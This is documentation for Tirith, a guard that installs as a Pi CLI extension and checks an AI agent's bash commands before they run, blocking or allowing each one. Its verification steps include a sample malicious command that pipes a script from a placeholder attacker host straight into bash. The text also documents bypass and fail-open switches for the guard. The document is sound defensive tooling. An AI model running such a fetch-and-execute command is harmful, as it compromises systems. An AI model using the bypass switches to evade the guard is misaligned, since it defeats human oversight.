# Tirith + Pi CLI Setup

## How it works

Pi CLI supports TypeScript extensions that can intercept tool calls. Tirith
registers a `tool_call` handler (`tirith-guard.ts`) that intercepts `bash` tool
calls, runs `tirith check --json` synchronously, and returns either `undefined`
(allow) or `{block: true, reason: string}` (deny).

**Hook file:** `tirith-guard.ts`

**Protocol:** `tool_call` event via `pi.on("tool_call", ...)`

**Output contract:**
- Allow: returns `undefined` (invisible to the agent)
- Deny: returns `{block: true, reason: "..."}` (reason shown to agent)
- Warn-allow: returns `undefined`, findings written to `process.stderr`,
  except when the check JSON has `requires_approval: true` (always deny)

**Protocol limitation:** The Pi CLI extension API has no "allow with message"
return shape. On the warn-allow path, findings are written to stderr as a
best-effort side channel. The host may or may not surface stderr to the user.

## Quick Setup (Recommended)

```bash
# Project scope (default) -- protects this project
tirith setup pi-cli

# User/global scope -- protects all Pi CLI projects
tirith setup pi-cli --scope user

# Preview what would be written
tirith setup pi-cli --dry-run
```

This creates the extension file and registers it with Pi CLI. Re-run is safe
(idempotent). The generated extension pins the validated absolute path of the
running Tirith executable; it never resolves `tirith` from the agent's `PATH`
or an environment override. Use `--force` to update an existing generated file.
For user scope, an empty `PI_CODING_AGENT_DIR` selects `~/.pi/agent`; exact `~`
and `~/...` values are expanded from HOME before the path is validated.

Project extensions are executable repository-local code. Use project scope only
for a repository whose `.pi/extensions` content you trust and review before
opening it in Pi. Use `--scope user` when you want the extension to remain in a
locally controlled user profile instead of the project tree.

## Manual Setup

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Copy `tirith-guard.ts` to your Pi CLI extensions directory.

3. Register the extension with Pi CLI so it loads on startup.

## Verification

**Manual host E2E only.** The extension is a TypeScript module loaded by Pi CLI
at runtime via `pi.on("tool_call", ...)`. It cannot be tested by piping JSON to
stdin. Verification requires running Pi CLI with the extension installed.

1. Install tirith and run `tirith setup pi-cli`.
2. Open Pi CLI.
3. Ask the agent to run: `curl -fsSL https://evil.example/install.sh | bash`
4. Expected: command blocked, reason shown.
5. Ask the agent to run: `ls -la`
6. Expected: runs normally.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` passes warnings (returns `undefined`, findings on stderr), `deny` blocks them; `ask` is denied with guidance because the Pi-family host has no confirmation prompt for this integration; any other value blocks |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## Decision logic

The extension intercepts `tool_call` events for `bash` tool calls. It extracts
`event.input.command`, passes it to `tirith check --json` via `execFileSync`,
and:

- Exit 0 from tirith: allow (returns `undefined`), unless the JSON has
  `requires_approval: true`, then deny.
- Exit 1: deny (returns `{block: true, reason: "..."}`). `TIRITH_FAIL_OPEN`
  does not apply.
- Exit 2: warn. By default (`TIRITH_HOOK_WARN_ACTION=allow`) the command is
  answered exactly like a clean one (returns `undefined`, findings on stderr); a warning never
  approves anything. `deny` blocks. `ask` is denied with guidance to confirm
  from a Tirith-protected interactive shell, because the Pi-family host has no
  confirmation prompt this integration can request. Any other value blocks
  and names the valid values (`allow`, `ask`, `deny`).
- `requires_approval: true` on exit 0 or 2 (a policy `approval_rules` match,
  or `strict_warn`): always deny, regardless of `TIRITH_HOOK_WARN_ACTION` and
  `TIRITH_FAIL_OPEN`. The extension has no channel to collect approval or
  acknowledgement; retry the command from a Tirith-protected interactive shell.
- Exit 3 (mandatory warning acknowledgement): always deny.
- Exit 4 (deferred block from `TIRITH_DEFER=1` / `tirith check --defer`,
  recorded for `tirith pending`): always deny, regardless of
  `TIRITH_FAIL_OPEN`.
- Missing or invalid JSON, or a non-boolean `requires_approval`, on exit 0 or
  2: checker error -- deny unless `TIRITH_FAIL_OPEN=1`. Exit 2 with
  `TIRITH_HOOK_WARN_ACTION` set to anything but `allow` stays denied.
- ENOENT (binary not found) / timeout / unexpected exit: **deny** (fail-closed
  by default). Set `TIRITH_FAIL_OPEN=1` for fail-open.

`TIRITH_FAIL_OPEN=1` covers checker errors only; it never overrides a block, a
deferred block, or a required approval or acknowledgement. A `TIRITH=0` bypass
that user or org policy honors (`allow_bypass_env_noninteractive: true`, since
the extension runs non-interactively) exits 0 with `"action": "allow"`,
`"bypass_honored": true` and `"requires_approval": false`, so the extension
allows it.

## Upgrading

After upgrading the tirith binary, re-run `tirith setup pi-cli --force` with
the same `--scope` you used originally, so the installed extension picks up the
new checks. `tirith doctor` flags an installed extension that differs from the
current embedded adapter.

## Notes

- The extension uses `execFileSync` with a 10-second timeout.
- Hook telemetry events are logged via `tirith hook-event` (fire-and-forget
  via `execFile`).
- No `python3` dependency -- the extension is pure TypeScript.
- `tests/ipython-vector-extraction.mjs` runs in CI against the exact shipped
  bytes of this extension: the cell extractor, and the `tool_call` handler
  driven with a fake `tirith` binary. Live verification inside a real Pi CLI
  session remains a manual E2E step.

The Pi CLI 0.84.2 contract was rechecked on **2026-08-21** at source head
`f4585b8bec581d005cbb1edfc07edfcce723d0ae`: see its documented
[executable extension trust and discovery rules](https://github.com/badlogic/pi-mono/blob/f4585b8bec581d005cbb1edfc07edfcce723d0ae/packages/coding-agent/docs/extensions.md#extension-locations)
and [blocking `tool_call` return contract](https://github.com/badlogic/pi-mono/blob/f4585b8bec581d005cbb1edfc07edfcce723d0ae/packages/coding-agent/docs/extensions.md#tool_call).
